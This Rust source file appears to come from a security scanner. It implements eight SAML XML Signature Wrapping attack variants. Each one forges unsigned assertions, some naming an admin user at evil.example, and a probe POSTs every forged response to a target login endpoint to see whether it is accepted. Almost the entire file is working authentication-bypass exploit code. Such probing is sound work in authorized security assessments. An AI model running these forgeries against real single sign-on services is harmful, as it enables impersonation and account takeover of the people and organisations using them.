//! SAML XML Signature Wrapping (XSW) attack probes — Phase 7.
//!
//! Chain of Responsibility pattern: [`XswHandler`] implementations are linked
//! in a chain; each one attempts its XSW variant, then delegates to the next.
//! All XML manipulation is string-based — no external XML crate required.

use anyhow::{Result, anyhow};
use std::fmt;
use thiserror::Error;

use crate::probe::jwt_probe::Severity;

// ──────────────────────────────────────────────────────────────────────────────
// Error
// ──────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Error)]
pub enum SamlProbeError {
    #[error("SAML XML malformed: {0}")]
    Malformed(String),
    #[error("required element not found: {0}")]
    NotFound(String),
}

// ──────────────────────────────────────────────────────────────────────────────
// Minimal string-based XML helpers
// ──────────────────────────────────────────────────────────────────────────────

/// Extract the first occurrence of an XML element with `tag_name` (without
/// namespace prefix), returning `(start_index, end_index, full_element_str)`.
fn find_element<'a>(xml: &'a str, tag_name: &str) -> Option<(usize, usize, &'a str)> {
    // Match opening tag allowing namespace-prefixed variants, e.g. <saml:Assertion or <Assertion.
    let open_candidates = [
        format!("<{tag_name} "),
        format!("<{tag_name}>"),
        format!(":{tag_name} "),
        format!(":{tag_name}>"),
    ];
    let start = open_candidates
        .iter()
        .find_map(|pat| xml.find(pat.as_str()))?;

    // Find the matching closing tag.  We look for </…Tag> regardless of prefix.
    let close_pat_bare = format!("</{tag_name}>");
    // Also match namespaced close tags.
    let end_search = &xml[start..];
    // Try bare close first, then scan for :</tag_name>
    let close_rel = end_search.find(&close_pat_bare).or_else(|| {
        let colon_close = format!(":{tag_name}>");
        end_search.find(&colon_close).map(|i| {
            // Back up past the "</prefix:" part.
            let before = &end_search[..i];
            before.rfind('<').unwrap_or(i)
        })
    })?;

    // The close_rel is relative to `start`; the end is after the close tag.
    let close_abs = start + close_rel;
    // Find the '>' that terminates the closing tag.
    let end_abs = xml[close_abs..].find('>').map(|i| close_abs + i + 1)?;

    Some((start, end_abs, &xml[start..end_abs]))
}

/// Extract the `<ds:Signature …>…</ds:Signature>` block (or `<Signature …>`).
fn extract_signature(xml: &str) -> Option<(usize, usize, &str)> {
    find_element(xml, "Signature")
}

/// Extract the signed `<saml:Assertion …>…</saml:Assertion>` block.
fn extract_assertion(xml: &str) -> Option<(usize, usize, &str)> {
    find_element(xml, "Assertion")
}

/// Remove the substring at `[start, end)` from `s`.
fn remove_range(s: &str, start: usize, end: usize) -> String {
    format!("{}{}", &s[..start], &s[end..])
}

/// Insert `snippet` into `s` before index `pos`.
fn insert_before(s: &str, pos: usize, snippet: &str) -> String {
    format!("{}{}{}", &s[..pos], snippet, &s[pos..])
}

// ──────────────────────────────────────────────────────────────────────────────
// XswHandler trait — Chain of Responsibility
// ──────────────────────────────────────────────────────────────────────────────

/// Chain of Responsibility: try XSW variants in order.
pub trait XswHandler: Send + Sync + fmt::Debug {
    fn name(&self) -> &'static str;
    /// Apply the XSW variant to `saml_xml` and return the modified XML.
    fn apply(&self, saml_xml: &str) -> Result<String>;
    /// Return the next handler in the chain, if any.
    fn next(&self) -> Option<&dyn XswHandler>;
}

// ──────────────────────────────────────────────────────────────────────────────
// XSW1 — move Signature before signed element, add unsigned copy after root
// ──────────────────────────────────────────────────────────────────────────────

/// XSW1: prepend the Signature to the document root, append an evil Assertion
/// copy without a Signature.  The parser processes the first Assertion (evil),
/// the verifier validates the second (legitimate but ignored by the app).
#[derive(Debug)]
pub struct Xsw1Handler {
    pub next: Option<Box<dyn XswHandler>>,
}

impl XswHandler for Xsw1Handler {
    fn name(&self) -> &'static str {
        "XSW1"
    }

    fn apply(&self, saml_xml: &str) -> Result<String> {
        let (sig_start, sig_end, sig_block) = extract_signature(saml_xml)
            .ok_or_else(|| anyhow!(SamlProbeError::NotFound("Signature".into())))?;
        let sig_block = sig_block.to_owned();

        // Remove signature from original position.
        let without_sig = remove_range(saml_xml, sig_start, sig_end);

        // Find the root element close (first '>') and insert Signature right after.
        let root_close = without_sig
            .find('>')
            .ok_or_else(|| anyhow!("no root element"))?;
        let with_sig_at_root = insert_before(&without_sig, root_close + 1, &sig_block);

        // Append an evil unsigned Assertion copy before </Response> (or at end).
        let (_, ass_end, ass_block) = extract_assertion(&with_sig_at_root)
            .ok_or_else(|| anyhow!(SamlProbeError::NotFound("Assertion".into())))?;
        let evil_assertion = ass_block.replace("ID=\"", "ID=\"evil_");
        let result = insert_before(&with_sig_at_root, ass_end, &evil_assertion);
        Ok(result)
    }

    fn next(&self) -> Option<&dyn XswHandler> {
        self.next.as_deref()
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// XSW2 — move Signature after the signed element
// ──────────────────────────────────────────────────────────────────────────────

/// XSW2: place an evil unsigned Assertion before the legitimate one, and move
/// the Signature after the legitimate Assertion.
#[derive(Debug)]
pub struct Xsw2Handler {
    pub next: Option<Box<dyn XswHandler>>,
}

impl XswHandler for Xsw2Handler {
    fn name(&self) -> &'static str {
        "XSW2"
    }

    fn apply(&self, saml_xml: &str) -> Result<String> {
        let (sig_start, sig_end, sig_block) = extract_signature(saml_xml)
            .ok_or_else(|| anyhow!(SamlProbeError::NotFound("Signature".into())))?;
        let sig_block = sig_block.to_owned();
        let without_sig = remove_range(saml_xml, sig_start, sig_end);

        let (ass_start, ass_end, ass_block) = extract_assertion(&without_sig)
            .ok_or_else(|| anyhow!(SamlProbeError::NotFound("Assertion".into())))?;
        let ass_block = ass_block.to_owned();
        let evil = ass_block.replace("ID=\"", "ID=\"evil_");

        // Insert evil Assertion before legitimate, append Signature after legitimate.
        let step1 = insert_before(&without_sig, ass_start, &evil);
        // Recalculate ass_end after insertion.
        let new_ass_end = ass_end + evil.len();
        let result = insert_before(&step1, new_ass_end, &sig_block);
        Ok(result)
    }

    fn next(&self) -> Option<&dyn XswHandler> {
        self.next.as_deref()
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// XSW3 — evil Assertion as sibling of root element
// ──────────────────────────────────────────────────────────────────────────────

/// XSW3: copy the Reference element as a sibling of the root; the Signature
/// still covers the legitimate child.
#[derive(Debug)]
pub struct Xsw3Handler {
    pub next: Option<Box<dyn XswHandler>>,
}

impl XswHandler for Xsw3Handler {
    fn name(&self) -> &'static str {
        "XSW3"
    }

    fn apply(&self, saml_xml: &str) -> Result<String> {
        let (_, ass_end, ass_block) = extract_assertion(saml_xml)
            .ok_or_else(|| anyhow!(SamlProbeError::NotFound("Assertion".into())))?;
        let evil = ass_block.replace("ID=\"", "ID=\"evil_xsw3_");
        // Remove signature from evil copy so it carries no proof.
        let evil_no_sig = if let Some((s, e, _)) = extract_signature(&evil) {
            remove_range(&evil, s, e)
        } else {
            evil
        };
        Ok(insert_before(saml_xml, ass_end, &evil_no_sig))
    }

    fn next(&self) -> Option<&dyn XswHandler> {
        self.next.as_deref()
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// XSW4 — evil Assertion wraps legitimate Assertion
// ──────────────────────────────────────────────────────────────────────────────

#[derive(Debug)]
pub struct Xsw4Handler {
    pub next: Option<Box<dyn XswHandler>>,
}

impl XswHandler for Xsw4Handler {
    fn name(&self) -> &'static str {
        "XSW4"
    }

    fn apply(&self, saml_xml: &str) -> Result<String> {
        let (ass_start, ass_end, ass_block) = extract_assertion(saml_xml)
            .ok_or_else(|| anyhow!(SamlProbeError::NotFound("Assertion".into())))?;
        let wrapped = format!(
            "<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" \
             ID=\"evil_xsw4\" Version=\"2.0\" IssueInstant=\"2000-01-01T00:00:00Z\">\
             <saml:Issuer>evil</saml:Issuer>{}</saml:Assertion>",
            ass_block
        );
        let result = format!(
            "{}{}{}",
            &saml_xml[..ass_start],
            wrapped,
            &saml_xml[ass_end..]
        );
        Ok(result)
    }

    fn next(&self) -> Option<&dyn XswHandler> {
        self.next.as_deref()
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// XSW5 — Signature wraps evil Assertion; legitimate Assertion is outside
// ──────────────────────────────────────────────────────────────────────────────

#[derive(Debug)]
pub struct Xsw5Handler {
    pub next: Option<Box<dyn XswHandler>>,
}

impl XswHandler for Xsw5Handler {
    fn name(&self) -> &'static str {
        "XSW5"
    }

    fn apply(&self, saml_xml: &str) -> Result<String> {
        // Place an evil unsigned assertion right before the Signature block.
        let (sig_start, _, _) = extract_signature(saml_xml)
            .ok_or_else(|| anyhow!(SamlProbeError::NotFound("Signature".into())))?;
        let evil = "<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" \
                    ID=\"evil_xsw5\" Version=\"2.0\" IssueInstant=\"2000-01-01T00:00:00Z\">\
                    <saml:Issuer>evil</saml:Issuer>\
                    <saml:Subject><saml:NameID>admin@evil.example</saml:NameID></saml:Subject>\
                    </saml:Assertion>";
        Ok(insert_before(saml_xml, sig_start, evil))
    }

    fn next(&self) -> Option<&dyn XswHandler> {
        self.next.as_deref()
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// XSW6 — evil Assertion in Extensions element
// ──────────────────────────────────────────────────────────────────────────────

#[derive(Debug)]
pub struct Xsw6Handler {
    pub next: Option<Box<dyn XswHandler>>,
}

impl XswHandler for Xsw6Handler {
    fn name(&self) -> &'static str {
        "XSW6"
    }

    fn apply(&self, saml_xml: &str) -> Result<String> {
        // Inject evil Assertion into an Extensions block inserted at root level.
        let root_close = saml_xml.find('>').ok_or_else(|| anyhow!("no root close"))?;
        let evil_ext = "<samlp:Extensions>\
                        <saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" \
                        ID=\"evil_xsw6\" Version=\"2.0\" IssueInstant=\"2000-01-01T00:00:00Z\">\
                        <saml:Issuer>evil</saml:Issuer>\
                        <saml:Subject><saml:NameID>admin@evil.example</saml:NameID></saml:Subject>\
                        </saml:Assertion></samlp:Extensions>";
        Ok(insert_before(saml_xml, root_close + 1, evil_ext))
    }

    fn next(&self) -> Option<&dyn XswHandler> {
        self.next.as_deref()
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// XSW7 — evil Assertion in KeyInfo
// ──────────────────────────────────────────────────────────────────────────────

#[derive(Debug)]
pub struct Xsw7Handler {
    pub next: Option<Box<dyn XswHandler>>,
}

impl XswHandler for Xsw7Handler {
    fn name(&self) -> &'static str {
        "XSW7"
    }

    fn apply(&self, saml_xml: &str) -> Result<String> {
        // Insert evil Assertion inside ds:KeyInfo (if present), else prepend.
        let insert_pos = saml_xml
            .find("<ds:KeyInfo>")
            .map(|i| i + "<ds:KeyInfo>".len())
            .or_else(|| saml_xml.find('>').map(|i| i + 1))
            .ok_or_else(|| anyhow!("cannot determine insertion point"))?;
        let evil = "<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" \
                    ID=\"evil_xsw7\" Version=\"2.0\" IssueInstant=\"2000-01-01T00:00:00Z\">\
                    <saml:Issuer>evil</saml:Issuer></saml:Assertion>";
        Ok(insert_before(saml_xml, insert_pos, evil))
    }

    fn next(&self) -> Option<&dyn XswHandler> {
        self.next.as_deref()
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// XSW8 — evil Assertion in Object element within Signature
// ──────────────────────────────────────────────────────────────────────────────

#[derive(Debug)]
pub struct Xsw8Handler {
    pub next: Option<Box<dyn XswHandler>>,
}

impl XswHandler for Xsw8Handler {
    fn name(&self) -> &'static str {
        "XSW8"
    }

    fn apply(&self, saml_xml: &str) -> Result<String> {
        // Inject a ds:Object element containing an evil Assertion into the Signature.
        let sig_close = saml_xml
            .find("</ds:Signature>")
            .or_else(|| saml_xml.find("</Signature>"))
            .ok_or_else(|| anyhow!(SamlProbeError::NotFound("Signature close".into())))?;
        let evil_obj = "<ds:Object><saml:Assertion \
                        xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" \
                        ID=\"evil_xsw8\" Version=\"2.0\" IssueInstant=\"2000-01-01T00:00:00Z\">\
                        <saml:Issuer>evil</saml:Issuer></saml:Assertion></ds:Object>";
        Ok(insert_before(saml_xml, sig_close, evil_obj))
    }

    fn next(&self) -> Option<&dyn XswHandler> {
        self.next.as_deref()
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// SamlFinding
// ──────────────────────────────────────────────────────────────────────────────

/// Result of testing one XSW variant against an ACS endpoint.
#[derive(Debug, Clone)]
pub struct SamlFinding {
    /// XSW variant name, e.g. `"XSW1"`.
    pub xsw_variant: String,
    /// Whether the ACS endpoint accepted the forged assertion.
    pub accepted: bool,
    /// Attributes that appear to have been injected into the session.
    pub injected_attributes: Vec<(String, String)>,
    /// Critical if accepted, Low if rejected.
    pub severity: Severity,
}

// ──────────────────────────────────────────────────────────────────────────────
// Minimal async HTTP abstraction
// ──────────────────────────────────────────────────────────────────────────────

/// Callers wrap their HTTP client to implement this trait.
#[async_trait::async_trait]
pub trait SamlHttpClient: Send + Sync {
    /// POST `saml_response` (URL-encoded) to `acs_url`.
    /// Returns `(status_code, response_body)`.
    async fn post_saml(&self, acs_url: &str, saml_response: &str) -> Result<(u16, String)>;
}

// ──────────────────────────────────────────────────────────────────────────────
// SamlXswProbe
// ──────────────────────────────────────────────────────────────────────────────

/// Runs the full XSW chain against an ACS endpoint.
pub struct SamlXswProbe {
    pub chain: Box<dyn XswHandler>,
}

impl SamlXswProbe {
    /// Build the full XSW1–XSW8 chain.
    pub fn full_chain() -> Self {
        // Build from the end of the chain backward.
        let h8: Box<dyn XswHandler> = Box::new(Xsw8Handler { next: None });
        let h7 = Box::new(Xsw7Handler { next: Some(h8) });
        let h6 = Box::new(Xsw6Handler { next: Some(h7) });
        let h5 = Box::new(Xsw5Handler { next: Some(h6) });
        let h4 = Box::new(Xsw4Handler { next: Some(h5) });
        let h3 = Box::new(Xsw3Handler { next: Some(h4) });
        let h2 = Box::new(Xsw2Handler { next: Some(h3) });
        let h1 = Box::new(Xsw1Handler { next: Some(h2) });
        Self { chain: h1 }
    }

    /// Walk the chain, POST each forged SAML response, collect findings.
    pub async fn probe(
        &self,
        client: &dyn SamlHttpClient,
        acs_url: &str,
        base_saml: &str,
    ) -> Result<Vec<SamlFinding>> {
        let mut findings = Vec::new();
        let mut current: Option<&dyn XswHandler> = Some(self.chain.as_ref());

        while let Some(handler) = current {
            let forged = match handler.apply(base_saml) {
                Ok(xml) => xml,
                Err(e) => {
                    tracing::warn!(variant = handler.name(), error = %e, "XSW apply failed");
                    current = handler.next();
                    continue;
                }
            };

            let (status, body) = client
                .post_saml(acs_url, &forged)
                .await
                .unwrap_or((0, String::new()));
            let accepted = status == 200 || status == 302;

            // Heuristic: look for the evil NameID in the response body.
            let injected = if body.contains("admin@evil.example") {
                vec![("NameID".into(), "admin@evil.example".into())]
            } else {
                vec![]
            };

            findings.push(SamlFinding {
                xsw_variant: handler.name().to_owned(),
                accepted,
                injected_attributes: injected,
                severity: if accepted {
                    Severity::Critical
                } else {
                    Severity::Low
                },
            });

            current = handler.next();
        }

        Ok(findings)
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Tests
// ──────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn minimal_saml() -> &'static str {
        r##"<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="resp1">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="assert1" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo><ds:Reference URI="#assert1"/></ds:SignedInfo>
      <ds:SignatureValue>FAKESIG==</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>"##
    }

    #[test]
    fn xsw1_produces_evil_assertion() {
        let handler = Xsw1Handler { next: None };
        let result = handler.apply(minimal_saml()).unwrap();
        assert!(
            result.contains("evil_assert1") || result.contains("ID=\"evil_"),
            "XSW1 should inject an evil assertion"
        );
    }

    #[test]
    fn xsw2_produces_evil_assertion() {
        let handler = Xsw2Handler { next: None };
        let result = handler.apply(minimal_saml()).unwrap();
        assert!(
            result.contains("evil_"),
            "XSW2 should inject evil assertion"
        );
    }

    #[test]
    fn xsw3_appends_evil_copy() {
        let handler = Xsw3Handler { next: None };
        let result = handler.apply(minimal_saml()).unwrap();
        assert!(
            result.contains("evil_xsw3_"),
            "XSW3 should inject evil assertion copy"
        );
    }

    #[test]
    fn xsw4_wraps_legitimate() {
        let handler = Xsw4Handler { next: None };
        let result = handler.apply(minimal_saml()).unwrap();
        assert!(
            result.contains("evil_xsw4"),
            "XSW4 should wrap with evil assertion"
        );
    }

    #[test]
    fn xsw8_injects_into_signature() {
        let handler = Xsw8Handler { next: None };
        let result = handler.apply(minimal_saml()).unwrap();
        assert!(
            result.contains("evil_xsw8"),
            "XSW8 should inject into Signature"
        );
        assert!(
            result.contains("ds:Object"),
            "XSW8 should use ds:Object wrapper"
        );
    }

    #[test]
    fn full_chain_has_eight_handlers() {
        let probe = SamlXswProbe::full_chain();
        let mut count = 0usize;
        let mut cur: Option<&dyn XswHandler> = Some(probe.chain.as_ref());
        while let Some(h) = cur {
            count += 1;
            cur = h.next();
        }
        assert_eq!(count, 8, "chain should have XSW1–XSW8");
    }
}
